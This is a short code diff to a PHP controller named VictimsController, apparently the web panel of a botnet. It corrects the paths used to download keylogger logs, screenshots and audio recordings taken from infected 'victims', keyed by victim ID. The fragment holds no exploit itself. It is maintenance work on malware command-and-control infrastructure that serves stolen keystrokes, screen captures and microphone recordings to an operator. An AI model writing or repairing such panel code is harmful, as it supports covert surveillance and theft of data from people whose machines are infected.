@@ -200,7 +200,7 @@ class VictimsController extends Controller
         $uid = $request->victim_uid;
 
 
-        $storagePath = '/home/debian/PA-BOTNET-PYSRV/results/screenshot/'.$uid.'/'.$keylogger_id.'.png';
+        $storagePath = '/home/debian/PA-BOTNET-PYSRV/results/keylogger/'.$uid.'/'.$keylogger_id.'.txt';
 
         return response()->download($storagePath);
     }
@@ -232,7 +232,7 @@ class VictimsController extends Controller
         $uid = $request->victim_uid;
 
 
-        $storagePath = '/home/debian/PA-BOTNET-PYSRV/results/screenshot/'.$uid.'/'.$record_id.'.png';
+        $storagePath = '/home/debian/PA-BOTNET-PYSRV/results/screenshot/'.$uid.'/'.$screenshot_id.'.png';
 
         return response()->download($storagePath);
     }
@@ -277,7 +277,7 @@ class VictimsController extends Controller
         $uid = $request->victim_uid;
 
 
-        $storagePath = '/home/debian/PA-BOTNET-PYSRV/results/record/'.$uid.'/'.$record_id.'.png';
+        $storagePath = '/home/debian/PA-BOTNET-PYSRV/results/record/'.$uid.'/'.$record_id.'.wav';
 
         return response()->download($storagePath);
     }
